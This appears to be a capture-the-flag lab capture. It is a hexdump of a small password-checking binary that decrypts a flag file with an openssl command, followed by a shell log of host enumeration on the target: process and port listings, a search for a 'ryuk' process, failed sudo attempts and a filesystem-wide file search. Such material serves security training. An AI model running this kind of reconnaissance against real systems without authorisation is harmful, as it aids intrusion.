00000a40  ff ff 89 c7 e8 07 fd ff  ff 48 8b 85 98 fe ff ff  |.........H......|
00000a50  48 89 c7 e8 78 fd ff ff  88 85 97 fe ff ff 80 bd  |H...x...........|
00000a60  97 fe ff ff ff 75 d4 48  8b 85 98 fe ff ff 48 89  |.....u.H......H.|
00000a70  c7 e8 0a fd ff ff bf 05  00 00 00 e8 c0 fd ff ff  |................|
00000a80  bf a7 0b 40 00 e8 d6 fc  ff ff bf 92 0b 40 00 e8  |...@.........@..|
00000a90  cc fc ff ff bf 05 0c 40  00 e8 c2 fc ff ff b8 00  |.......@........|
00000aa0  00 00 00 48 8b 5d e8 64  48 33 1c 25 28 00 00 00  |...H.].dH3.%(...|
00000ab0  74 05 e8 d9 fc ff ff 48  81 c4 68 01 00 00 5b 5d  |t......H..h...[]|
00000ac0  c3 66 2e 0f 1f 84 00 00  00 00 00 0f 1f 44 00 00  |.f...........D..|
00000ad0  41 57 41 89 ff 41 56 49  89 f6 41 55 49 89 d5 41  |AWA..AVI..AUI..A|
00000ae0  54 4c 8d 25 28 03 20 00  55 48 8d 2d 28 03 20 00  |TL.%(. .UH.-(. .|
00000af0  53 4c 29 e5 31 db 48 c1  fd 03 48 83 ec 08 e8 1d  |SL).1.H...H.....|
00000b00  fc ff ff 48 85 ed 74 1e  0f 1f 84 00 00 00 00 00  |...H..t.........|
00000b10  4c 89 ea 4c 89 f6 44 89  ff 41 ff 14 dc 48 83 c3  |L..L..D..A...H..|
00000b20  01 48 39 eb 75 ea 48 83  c4 08 5b 5d 41 5c 41 5d  |.H9.u.H...[]A\A]|
00000b30  41 5e 41 5f c3 66 66 2e  0f 1f 84 00 00 00 00 00  |A^A_.ff.........|
00000b40  f3 c3 00 00 48 83 ec 08  48 83 c4 08 c3 00 00 00  |....H...H.......|
00000b50  01 00 02 00 00 00 00 00  43 75 61 6c 20 65 73 20  |........Cual es |
00000b60  65 6c 20 6e 6f 6d 62 72  65 20 64 65 6c 20 6a 75  |el nombre del ju|
00000b70  65 67 6f 3a 20 00 0a 00  42 6c 75 66 66 65 72 00  |ego: ...Bluffer.|
00000b80  50 61 73 73 77 6f 72 64  20 49 6e 76 61 6c 69 64  |Password Invalid|
00000b90  2e 00 2f 74 6d 70 2f 66  6c 61 67 5f 6f 75 74 70  |../tmp/flag_outp|
00000ba0  75 74 2e 74 78 74 00 2f  75 73 72 2f 2e 66 6c 61  |ut.txt./usr/.fla|
00000bb0  67 2e 65 6e 63 00 00 00  6f 70 65 6e 73 73 6c 20  |g.enc...openssl |
00000bc0  65 6e 63 20 2d 61 65 73  2d 32 35 36 2d 63 62 63  |enc -aes-256-cbc|
00000bd0  20 2d 64 20 2d 69 6e 20  25 73 20 2d 6f 75 74 20  | -d -in %s -out |
00000be0  25 73 20 2d 70 61 73 73  20 70 61 73 73 3a 25 73  |%s -pass pass:%s|
00000bf0  20 32 3e 2f 64 65 76 2f  6e 75 6c 6c 00 72 00 45  | 2>/dev/null.r.E|
00000c00  72 72 6f 72 00 2f 75 73  72 2f 62 69 6e 2f 6f 70  |rror./usr/bin/op|
00000c10  65 6e 5f 66 6c 61 67 00  01 1b 03 3b 34 00 00 00  |en_flag....;4...|
00000c20  05 00 00 00 28 fb ff ff  80 00 00 00 38 fc ff ff  |....(.......8...|
00000c30  50 00 00 00 25 fd ff ff  a8 00 00 00 b8 fe ff ff  |P...%...........|
00000c40  d0 00 00 00 28 ff ff ff  18 01 00 00 00 00 00 00  |....(...........|
00000c50  14 00 00 00 00 00 00 00  01 7a 52 00 01 78 10 01  |.........zR..x..|
00000c60  1b 0c 07 08 90 01 07 10  14 00 00 00 1c 00 00 00  |................|
00000c70  e0 fb ff ff 2a 00 00 00  00 00 00 00 00 00 00 00  |....*...........|
00000c80  14 00 00 00 00 00 00 00  01 7a 52 00 01 78 10 01  |.........zR..x..|
00000c90  1b 0c 07 08 90 01 00 00  24 00 00 00 1c 00 00 00  |........$.......|
00000ca0  a0 fa ff ff 10 01 00 00  00 0e 10 46 0e 18 4a 0f  |...........F..J.|
00000cb0  0b 77 08 80 00 3f 1a 3b  2a 33 24 22 00 00 00 00  |.w...?.;*3$"....|
00000cc0  24 00 00 00 44 00 00 00  75 fc ff ff 84 01 00 00  |$...D...u.......|
00000cd0  00 41 0e 10 86 02 43 0d  06 48 83 03 03 77 01 0c  |.A....C..H...w..|
00000ce0  07 08 00 00 00 00 00 00  44 00 00 00 6c 00 00 00  |........D...l...|
00000cf0  e0 fd ff ff 65 00 00 00  00 42 0e 10 8f 02 45 0e  |....e....B....E.|
00000d00  18 8e 03 45 0e 20 8d 04  45 0e 28 8c 05 48 0e 30  |...E. ..E.(..H.0|
00000d10  86 06 48 0e 38 83 07 4d  0e 40 6c 0e 38 41 0e 30  |..H.8..M.@l.8A.0|
00000d20  41 0e 28 42 0e 20 42 0e  18 42 0e 10 42 0e 08 00  |A.(B. B..B..B...|
00000d30  14 00 00 00 b4 00 00 00  08 fe ff ff 02 00 00 00  |................|
00000d40  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000e10  10 09 40 00 00 00 00 00  f0 08 40 00 00 00 00 00  |..@.......@.....|
00000e20  00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|
00000e30  01 00 00 00 00 00 00 00  0c 00 00 00 00 00 00 00  |................|
00000e40  20 07 40 00 00 00 00 00  0d 00 00 00 00 00 00 00  | .@.............|
00000e50  44 0b 40 00 00 00 00 00  19 00 00 00 00 00 00 00  |D.@.............|
00000e60  10 0e 60 00 00 00 00 00  1b 00 00 00 00 00 00 00  |..`.............|
00000e70  08 00 00 00 00 00 00 00  1a 00 00 00 00 00 00 00  |................|
00000e80  18 0e 60 00 00 00 00 00  1c 00 00 00 00 00 00 00  |..`.............|
00000e90  08 00 00 00 00 00 00 00  f5 fe ff 6f 00 00 00 00  |...........o....|
00000ea0  98 02 40 00 00 00 00 00  05 00 00 00 00 00 00 00  |..@.............|
00000eb0  70 04 40 00 00 00 00 00  06 00 00 00 00 00 00 00  |p.@.............|
00000ec0  c0 02 40 00 00 00 00 00  0a 00 00 00 00 00 00 00  |..@.............|
00000ed0  ab 00 00 00 00 00 00 00  0b 00 00 00 00 00 00 00  |................|
00000ee0  18 00 00 00 00 00 00 00  15 00 00 00 00 00 00 00  |................|
00000ef0  00 00 00 00 00 00 00 00  03 00 00 00 00 00 00 00  |................|
00000f00  00 10 60 00 00 00 00 00  02 00 00 00 00 00 00 00  |..`.............|
00000f10  80 01 00 00 00 00 00 00  14 00 00 00 00 00 00 00  |................|
00000f20  07 00 00 00 00 00 00 00  17 00 00 00 00 00 00 00  |................|
00000f30  a0 05 40 00 00 00 00 00  07 00 00 00 00 00 00 00  |..@.............|
00000f40  70 05 40 00 00 00 00 00  08 00 00 00 00 00 00 00  |p.@.............|
00000f50  30 00 00 00 00 00 00 00  09 00 00 00 00 00 00 00  |0...............|
00000f60  18 00 00 00 00 00 00 00  fe ff ff 6f 00 00 00 00  |...........o....|
00000f70  40 05 40 00 00 00 00 00  ff ff ff 6f 00 00 00 00  |@.@........o....|
00000f80  01 00 00 00 00 00 00 00  f0 ff ff 6f 00 00 00 00  |...........o....|
00000f90  1c 05 40 00 00 00 00 00  00 00 00 00 00 00 00 00  |..@.............|
00000fa0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00001000  28 0e 60 00 00 00 00 00  00 00 00 00 00 00 00 00  |(.`.............|
00001010  00 00 00 00 00 00 00 00  56 07 40 00 00 00 00 00  |........V.@.....|
00001020  66 07 40 00 00 00 00 00  76 07 40 00 00 00 00 00  |f.@.....v.@.....|
00001030  86 07 40 00 00 00 00 00  96 07 40 00 00 00 00 00  |..@.......@.....|
00001040  a6 07 40 00 00 00 00 00  b6 07 40 00 00 00 00 00  |..@.......@.....|
00001050  c6 07 40 00 00 00 00 00  d6 07 40 00 00 00 00 00  |..@.......@.....|
00001060  e6 07 40 00 00 00 00 00  f6 07 40 00 00 00 00 00  |..@.......@.....|
00001070  06 08 40 00 00 00 00 00  16 08 40 00 00 00 00 00  |..@.......@.....|
00001080  26 08 40 00 00 00 00 00  36 08 40 00 00 00 00 00  |&.@.....6.@.....|
00001090  46 08 40 00 00 00 00 00  00 00 00 00 00 00 00 00  |F.@.............|
000010a0  00 00 00 00 00 00 00 00  47 43 43 3a 20 28 55 62  |........GCC: (Ub|
000010b0  75 6e 74 75 20 34 2e 38  2e 34 2d 32 75 62 75 6e  |untu 4.8.4-2ubun|
000010c0  74 75 31 7e 31 34 2e 30  34 2e 34 29 20 34 2e 38  |tu1~14.04.4) 4.8|
000010d0  2e 34 00 00 2e 73 68 73  74 72 74 61 62 00 2e 69  |.4...shstrtab..i|
000010e0  6e 74 65 72 70 00 2e 6e  6f 74 65 2e 41 42 49 2d  |nterp..note.ABI-|
000010f0  74 61 67 00 2e 6e 6f 74  65 2e 67 6e 75 2e 62 75  |tag..note.gnu.bu|
00001100  69 6c 64 2d 69 64 00 2e  67 6e 75 2e 68 61 73 68  |ild-id..gnu.hash|
00001110  00 2e 64 79 6e 73 79 6d  00 2e 64 79 6e 73 74 72  |..dynsym..dynstr|
00001120  00 2e 67 6e 75 2e 76 65  72 73 69 6f 6e 00 2e 67  |..gnu.version..g|
00001130  6e 75 2e 76 65 72 73 69  6f 6e 5f 72 00 2e 72 65  |nu.version_r..re|
00001140  6c 61 2e 64 79 6e 00 2e  72 65 6c 61 2e 70 6c 74  |la.dyn..rela.plt|
00001150  00 2e 69 6e 69 74 00 2e  74 65 78 74 00 2e 66 69  |..init..text..fi|
00001160  6e 69 00 2e 72 6f 64 61  74 61 00 2e 65 68 5f 66  |ni..rodata..eh_f|
00001170  72 61 6d 65 5f 68 64 72  00 2e 65 68 5f 66 72 61  |rame_hdr..eh_fra|
00001180  6d 65 00 2e 69 6e 69 74  5f 61 72 72 61 79 00 2e  |me..init_array..|
00001190  66 69 6e 69 5f 61 72 72  61 79 00 2e 6a 63 72 00  |fini_array..jcr.|
000011a0  2e 64 79 6e 61 6d 69 63  00 2e 67 6f 74 00 2e 67  |.dynamic..got..g|
000011b0  6f 74 2e 70 6c 74 00 2e  64 61 74 61 00 2e 62 73  |ot.plt..data..bs|
000011c0  73 00 2e 63 6f 6d 6d 65  6e 74 00 00 00 00 00 00  |s..comment......|
000011d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00001210  0b 00 00 00 01 00 00 00  02 00 00 00 00 00 00 00  |................|
00001220  38 02 40 00 00 00 00 00  38 02 00 00 00 00 00 00  |8.@.....8.......|
00001230  1c 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001240  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001250  13 00 00 00 07 00 00 00  02 00 00 00 00 00 00 00  |................|
00001260  54 02 40 00 00 00 00 00  54 02 00 00 00 00 00 00  |T.@.....T.......|
00001270  20 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ...............|
00001280  04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001290  21 00 00 00 07 00 00 00  02 00 00 00 00 00 00 00  |!...............|
000012a0  74 02 40 00 00 00 00 00  74 02 00 00 00 00 00 00  |t.@.....t.......|
000012b0  24 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |$...............|
000012c0  04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000012d0  34 00 00 00 f6 ff ff 6f  02 00 00 00 00 00 00 00  |4......o........|
000012e0  98 02 40 00 00 00 00 00  98 02 00 00 00 00 00 00  |..@.............|
000012f0  24 00 00 00 00 00 00 00  05 00 00 00 00 00 00 00  |$...............|
00001300  08 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001310  3e 00 00 00 0b 00 00 00  02 00 00 00 00 00 00 00  |>...............|
00001320  c0 02 40 00 00 00 00 00  c0 02 00 00 00 00 00 00  |..@.............|
00001330  b0 01 00 00 00 00 00 00  06 00 00 00 01 00 00 00  |................|
00001340  08 00 00 00 00 00 00 00  18 00 00 00 00 00 00 00  |................|
00001350  46 00 00 00 03 00 00 00  02 00 00 00 00 00 00 00  |F...............|
00001360  70 04 40 00 00 00 00 00  70 04 00 00 00 00 00 00  |p.@.....p.......|
00001370  ab 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001380  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001390  4e 00 00 00 ff ff ff 6f  02 00 00 00 00 00 00 00  |N......o........|
000013a0  1c 05 40 00 00 00 00 00  1c 05 00 00 00 00 00 00  |..@.............|
000013b0  24 00 00 00 00 00 00 00  05 00 00 00 00 00 00 00  |$...............|
000013c0  02 00 00 00 00 00 00 00  02 00 00 00 00 00 00 00  |................|
000013d0  5b 00 00 00 fe ff ff 6f  02 00 00 00 00 00 00 00  |[......o........|
000013e0  40 05 40 00 00 00 00 00  40 05 00 00 00 00 00 00  |@.@.....@.......|
000013f0  30 00 00 00 00 00 00 00  06 00 00 00 01 00 00 00  |0...............|
00001400  08 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001410  6a 00 00 00 04 00 00 00  02 00 00 00 00 00 00 00  |j...............|
00001420  70 05 40 00 00 00 00 00  70 05 00 00 00 00 00 00  |p.@.....p.......|
00001430  30 00 00 00 00 00 00 00  05 00 00 00 00 00 00 00  |0...............|
00001440  08 00 00 00 00 00 00 00  18 00 00 00 00 00 00 00  |................|
00001450  74 00 00 00 04 00 00 00  02 00 00 00 00 00 00 00  |t...............|
00001460  a0 05 40 00 00 00 00 00  a0 05 00 00 00 00 00 00  |..@.............|
00001470  80 01 00 00 00 00 00 00  05 00 00 00 0c 00 00 00  |................|
00001480  08 00 00 00 00 00 00 00  18 00 00 00 00 00 00 00  |................|
00001490  7e 00 00 00 01 00 00 00  06 00 00 00 00 00 00 00  |~...............|
000014a0  20 07 40 00 00 00 00 00  20 07 00 00 00 00 00 00  | .@..... .......|
000014b0  1a 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000014c0  04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000014d0  79 00 00 00 01 00 00 00  06 00 00 00 00 00 00 00  |y...............|
000014e0  40 07 40 00 00 00 00 00  40 07 00 00 00 00 00 00  |@.@.....@.......|
000014f0  10 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001500  10 00 00 00 00 00 00 00  10 00 00 00 00 00 00 00  |................|
00001510  84 00 00 00 01 00 00 00  06 00 00 00 00 00 00 00  |................|
00001520  50 08 40 00 00 00 00 00  50 08 00 00 00 00 00 00  |P.@.....P.......|
00001530  f2 02 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001540  10 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001550  8a 00 00 00 01 00 00 00  06 00 00 00 00 00 00 00  |................|
00001560  44 0b 40 00 00 00 00 00  44 0b 00 00 00 00 00 00  |D.@.....D.......|
00001570  09 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001580  04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001590  90 00 00 00 01 00 00 00  02 00 00 00 00 00 00 00  |................|
000015a0  50 0b 40 00 00 00 00 00  50 0b 00 00 00 00 00 00  |P.@.....P.......|
000015b0  c8 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000015c0  08 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000015d0  98 00 00 00 01 00 00 00  02 00 00 00 00 00 00 00  |................|
000015e0  18 0c 40 00 00 00 00 00  18 0c 00 00 00 00 00 00  |..@.............|
000015f0  34 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |4...............|
00001600  04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001610  a6 00 00 00 01 00 00 00  02 00 00 00 00 00 00 00  |................|
00001620  50 0c 40 00 00 00 00 00  50 0c 00 00 00 00 00 00  |P.@.....P.......|
00001630  fc 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001640  08 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001650  b0 00 00 00 0e 00 00 00  03 00 00 00 00 00 00 00  |................|
00001660  10 0e 60 00 00 00 00 00  10 0e 00 00 00 00 00 00  |..`.............|
00001670  08 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00001690  bc 00 00 00 0f 00 00 00  03 00 00 00 00 00 00 00  |................|
000016a0  18 0e 60 00 00 00 00 00  18 0e 00 00 00 00 00 00  |..`.............|
000016b0  08 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000016d0  c8 00 00 00 01 00 00 00  03 00 00 00 00 00 00 00  |................|
000016e0  20 0e 60 00 00 00 00 00  20 0e 00 00 00 00 00 00  | .`..... .......|
000016f0  08 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00001710  cd 00 00 00 06 00 00 00  03 00 00 00 00 00 00 00  |................|
00001720  28 0e 60 00 00 00 00 00  28 0e 00 00 00 00 00 00  |(.`.....(.......|
00001730  d0 01 00 00 00 00 00 00  06 00 00 00 00 00 00 00  |................|
00001740  08 00 00 00 00 00 00 00  10 00 00 00 00 00 00 00  |................|
00001750  d6 00 00 00 01 00 00 00  03 00 00 00 00 00 00 00  |................|
00001760  f8 0f 60 00 00 00 00 00  f8 0f 00 00 00 00 00 00  |..`.............|
00001770  08 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001780  08 00 00 00 00 00 00 00  08 00 00 00 00 00 00 00  |................|
00001790  db 00 00 00 01 00 00 00  03 00 00 00 00 00 00 00  |................|
000017a0  00 10 60 00 00 00 00 00  00 10 00 00 00 00 00 00  |..`.............|
000017b0  98 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000017c0  08 00 00 00 00 00 00 00  08 00 00 00 00 00 00 00  |................|
000017d0  e4 00 00 00 01 00 00 00  03 00 00 00 00 00 00 00  |................|
000017e0  98 10 60 00 00 00 00 00  98 10 00 00 00 00 00 00  |..`.............|
000017f0  10 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001800  08 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001810  ea 00 00 00 08 00 00 00  03 00 00 00 00 00 00 00  |................|
00001820  a8 10 60 00 00 00 00 00  a8 10 00 00 00 00 00 00  |..`.............|
00001830  10 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001840  08 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001850  ef 00 00 00 01 00 00 00  30 00 00 00 00 00 00 00  |........0.......|
00001860  00 00 00 00 00 00 00 00  a8 10 00 00 00 00 00 00  |................|
00001870  2b 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |+...............|
00001880  01 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|
00001890  01 00 00 00 03 00 00 00  00 00 00 00 00 00 00 00  |................|
000018a0  00 00 00 00 00 00 00 00  d3 10 00 00 00 00 00 00  |................|
000018b0  f8 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000018c0  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000018d0

ps aux | grep .ryuk
netstat -tulnpguakamo+  1494  0.0  0.2  11760  2248 ?        S    12:17   0:00 grep .ryuk

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 10.10.30.139:53         0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:44544           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:1986            0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::53                   :::*                    LISTEN      -               
tcp6       0      0 ::1:953                 :::*                    LISTEN      -               
tcp6       0      0 :::44544                :::*                    LISTEN      -               
tcp6       0      0 :::1986                 :::*                    LISTEN      -               
udp        0      0 0.0.0.0:62801           0.0.0.0:*                           -               
udp        0      0 10.10.30.139:53         0.0.0.0:*                           -               
udp        0      0 127.0.0.1:53            0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 10.10.255.255:137       0.0.0.0:*                           -               
udp        0      0 10.10.30.139:137        0.0.0.0:*                           -               
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -               
udp        0      0 10.10.255.255:138       0.0.0.0:*                           -               
udp        0      0 10.10.30.139:138        0.0.0.0:*                           -               
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -               
udp6       0      0 :::53                   :::*                                -               
udp6       0      0 :::36980                :::*                                -               
netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 10.10.30.139:53         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:44544           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:1986            0.0.0.0:*               LISTEN     
tcp6       0      0 :::53                   :::*                    LISTEN     
tcp6       0      0 ::1:953                 :::*                    LISTEN     
tcp6       0      0 :::44544                :::*                    LISTEN     
tcp6       0      0 :::1986                 :::*                    LISTEN     
udp        0      0 0.0.0.0:62801           0.0.0.0:*                          
udp        0      0 10.10.30.139:53         0.0.0.0:*                          
udp        0      0 127.0.0.1:53            0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:*                          
udp        0      0 10.10.255.255:137       0.0.0.0:*                          
udp        0      0 10.10.30.139:137        0.0.0.0:*                          
udp        0      0 0.0.0.0:137             0.0.0.0:*                          
udp        0      0 10.10.255.255:138       0.0.0.0:*                          
udp        0      0 10.10.30.139:138        0.0.0.0:*                          
udp        0      0 0.0.0.0:138             0.0.0.0:*                          
udp6       0      0 :::53                   :::*                               
udp6       0      0 :::36980                :::*                               



             sudo netstat -tulnp | grep 44544
sudo: no tty present and no askpass program specified

sudo netstat -tulnp | grep 44544
sudo: no tty present and no askpass program specified

netstat -tulnp | grep 44544
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:44544           0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::44544                :::*                    LISTEN      -               
ps aux | grep ryuk
guakamo+  1504  0.0  0.2  11760  2200 ?        S    12:31   0:00 grep ryuk

ps aux | grep ryuk
guakamo+  1504  0.0  0.2  11760  2200 ?        S    12:31   0:00 grep ryuk

find / -type f -name "*.txt" -exec ls -l {} \;
find: `/root': Permission denied
find: `/run/lighttpd': Permission denied
find: `/run/watershed': Permission denied
find: `/run/user/1001': Permission denied
find: `/run/lock/lvm': Permission denied
find: `/home/bluffer': Permission denied
-rw-r--r-- 1 root root 19 Apr  9 16:59 /home/guakamole/warning.txt
find: `/lost+found': Permission denied
find: `/usr/local/samba/private/msg.sock': Permission denied
find: `/usr/local/samba/var/run/ncalrpc/np': Permission denied
find: `/usr/local/samba/var/cores': Permission denied
-rw-r--r-- 1 root root 1711708 Jan 26  2016 /usr/local/samba/share/setup/display-specifiers/DisplaySpecifiers-Win2k8R2.txt
-rw-r--r-- 1 root root 1514235 Jan 26  2016 /usr/local/samba/share/setup/display-specifiers/DisplaySpecifiers-Win2k3R2.txt
-rw-r--r-- 1 root root 1711076 Jan 26  2016 /usr/local/samba/share/setup/display-specifiers/DisplaySpecifiers-Win2k8.txt
-rw-r--r-- 1 root root 1206208 Jan 26  2016 /usr/local/samba/share/setup/display-specifiers/DisplaySpecifiers-Win2k0.txt
-rw-r--r-- 1 root root 1514232 Jan 26  2016 /usr/local/samba/share/setup/display-specifiers/DisplaySpecifiers-Win2k3.txt
-rw-r--r-- 1 root root 2061 Jan 26  2016 /usr/local/samba/share/setup/named.txt
-rw-r--r-- 1 root root 900 Jan 26  2016 /usr/local/samba/share/setup/prefixMap.txt
-rw-r--r-- 1 root root 416294 Jan 26  2016 /usr/local/samba/share/setup/ad-schema/MS-AD_Schema_2K8_R2_Attributes.txt
-rw-r--r-- 1 root root 172952 Jan 26  2016 /usr/local/samba/share/setup/ad-schema/MS-AD_Schema_2K8_R2_Classes.txt
-rw-r--r-- 1 root root 420615 Jan 26  2016 /usr/local/samba/share/setup/ad-schema/MS-AD_Schema_2K8_Attributes.txt
-rw-r--r-- 1 root root 234 Jan 26  2016 /usr/local/samba/share/setup/ad-schema/licence.txt
-rw-r--r-- 1 root root 172101 Jan 26  2016 /usr/local/samba/share/setup/ad-schema/MS-AD_Schema_2K8_Classes.txt
-rw-r--r-- 1 root staff 1090 Apr  8 23:02 /usr/local/lib/python3.4/dist-packages/pip-19.1.1.dist-info/LICENSE.txt
-rw-r--r-- 1 root staff 98 Apr  8 23:02 /usr/local/lib/python3.4/dist-packages/pip-19.1.1.dist-info/entry_points.txt
-rw-r--r-- 1 root staff 4 Apr  8 23:02 /usr/local/lib/python3.4/dist-packages/pip-19.1.1.dist-info/top_level.txt
-rw-r--r-- 1 root staff 1475 Apr  8 23:05 /usr/local/lib/python3.4/dist-packages/MarkupSafe-1.1.1.dist-info/LICENSE.txt
-rw-r--r-- 1 root staff 11 Apr  8 23:05 /usr/local/lib/python3.4/dist-packages/MarkupSafe-1.1.1.dist-info/top_level.txt
-rw-r--r-- 1 root root 21841 Jan 11  2016 /usr/src/linux-headers-4.4.0-142/scripts/spelling.txt
-rw-r--r-- 1 root root 3098 Jan 11  2016 /usr/src/linux-headers-4.4.0-142/arch/sh/include/mach-kfr2r09/mach/partner-jet-setup.txt
-rw-r--r-- 1 root root 1731 Jan 11  2016 /usr/src/linux-headers-4.4.0-142/arch/sh/include/mach-ecovec24/mach/partner-jet-setup.txt
-rw-r--r-- 1 root root 31246 Oct 13  2017 /usr/lib/xorg/protocol.txt
-rw-r--r-- 1 root root 890 Mar 18  2008 /usr/lib/python2.7/dist-packages/twisted/internet/iocpreactor/notes.txt
-rw-r--r-- 1 root root 468 Oct 18  2011 /usr/lib/python2.7/dist-packages/twisted/python/zsh/README.txt
-rw-r--r-- 1 root root 24 Feb 27  2014 /usr/lib/python2.7/dist-packages/ssh_import_id-3.21.egg-info/requires.txt
-rw-r--r-- 1 root root 252 Feb 27  2014 /usr/lib/python2.7/dist-packages/ssh_import_id-3.21.egg-info/SOURCES.txt
-rw-r--r-- 1 root root 1 Feb 27  2014 /usr/lib/python2.7/dist-packages/ssh_import_id-3.21.egg-info/dependency_links.txt
-rw-r--r-- 1 root root 1 Feb 27  2014 /usr/lib/python2.7/dist-packages/ssh_import_id-3.21.egg-info/top_level.txt
-rw-r--r-- 1 root root 165 Feb 23  2014 /usr/lib/python2.7/dist-packages/configobj-4.7.2.egg-info/SOURCES.txt
-rw-r--r-- 1 root root 1 Feb 23  2014 /usr/lib/python2.7/dist-packages/configobj-4.7.2.egg-info/dependency_links.txt
-rw-r--r-- 1 root root 19 Feb 23  2014 /usr/lib/python2.7/dist-packages/configobj-4.7.2.egg-info/top_level.txt
-rw-r--r-- 1 root root 3 Feb 23  2014 /usr/lib/python2.7/dist-packages/python_debian-0.1.21_nmu2ubuntu2.egg-info/requires.txt
-rw-r--r-- 1 root root 451 Feb 23  2014 /usr/lib/python2.7/dist-packages/python_debian-0.1.21_nmu2ubuntu2.egg-info/SOURCES.txt
-rw-r--r-- 1 root root 1 Feb 23  2014 /usr/lib/python2.7/dist-packages/python_debian-0.1.21_nmu2ubuntu2.egg-info/dependency_links.txt
-rw-r--r-- 1 root root 28 Feb 23  2014 /usr/lib/python2.7/dist-packages/python_debian-0.1.21_nmu2ubuntu2.egg-info/top_level.txt
-rw-r--r-- 1 root root 98 Mar 23  2014 /usr/lib/python2.7/dist-packages/zope.interface-4.0.5.egg-info/requires.txt
-rw-r--r-- 1 root root 2306 Mar 23  2014 /usr/lib/python2.7/dist-packages/zope.interface-4.0.5.egg-info/SOURCES.txt
-rw-r--r-- 1 root root 1 Mar 23  2014 /usr/lib/python2.7/dist-packages/zope.interface-4.0.5.egg-info/dependency_links.txt
-rw-r--r-- 1 root root 5 Mar 23  2014 /usr/lib/python2.7/dist-packages/zope.interface-4.0.5.egg-info/namespace_packages.txt
-rw-r--r-- 1 root root 5 Mar 23  2014 /usr/lib/python2.7/dist-packages/zope.interface-4.0.5.egg-info/top_level.txt
-rw-r--r-- 1 root root 12755 Nov 13  2018 /usr/lib/python2.7/LICENSE.txt
-rw-r--r-- 1 root root 6589 Nov 13  2018 /usr/lib/python2.7/lib2to3/Grammar.txt
-rw-r--r-- 1 root root 793 Nov 13  2018 /usr/lib/python2.7/lib2to3/PatternGrammar.txt
-rw-r--r-- 1 root root 8478 Nov 13  2018 /usr/lib/python3.4/idlelib/TODO.txt
-rw-r--r-- 1 root root 2502 Nov 13  2018 /usr/lib/python3.4/idlelib/README.txt
-rw-r--r-- 1 root root 10317 Nov 13  2018 /usr/lib/python3.4/idlelib/HISTORY.txt
-rw-r--r-- 1 root root 1865 Nov 13  2018 /usr/lib/python3.4/idlelib/CREDITS.txt
-rw-r--r-- 1 root root 3642 Nov 13  2018 /usr/lib/python3.4/idlelib/extend.txt
-rw-r--r-- 1 root root 17688 Nov 13  2018 /usr/lib/python3.4/idlelib/help.txt
